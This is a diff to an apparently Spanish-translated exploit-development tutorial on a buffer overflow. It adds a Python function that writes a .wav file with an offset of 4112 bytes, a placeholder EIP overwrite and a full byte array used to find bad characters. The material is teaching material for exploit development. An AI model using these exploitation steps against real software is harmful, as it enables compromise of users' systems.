@@ -165,9 +165,30 @@ Podemos utilizar `ERC` para generar el `.bin` archivo y generar una lista de t
 Esto también crea dos archivos en nuestro escritorio:
 
 - `ByteArray_1.txt`: Que contiene la cadena de todos los caracteres que podemos usar en nuestro exploit de Python
-- `ByteArray_1.bin`: Que podemos usar `ERC`más adelante para comparar con nuestra entrada en la memoria.
+- `ByteArray_1.bin`: Que podemos usar `ERC` más adelante para comparar con nuestra entrada en la memoria.
 
+## Actualizando nuestro exploit
 
+El siguiente paso sería generar un `.wav` archivo con la cadena de caracteres generada por `ERC`. Nuevamente escribiremos una nueva función `bad_chars()`, y usaremos un código similar a la `eip_control()` función, pero usaremos los caracteres bajo `C#`in `ByteArray_1.txt`. Crearemos una nueva lista de bytes `all_chars = bytes([])`, y pegaremos los caracteres entre los corchetes. Luego escribiremos en `chars.wav` el mismo `payload`from `eip_control()`, y agregaremos después `all_chars`. La función final se vería así:
+
+```python
+def bad_chars():
+    all_chars = bytes([
+        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
+        ...SNIP...
+        0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF
+    ])
+    
+    offset = 4112
+    buffer = b"A"*offset
+    eip = b"B"*4
+    payload = buffer + eip + all_chars
+    
+    with open('chars.wav', 'wb') as f:
+        f.write(payload)
+
+bad_chars()
+```
 
 
 ## Finding a Return Instruction
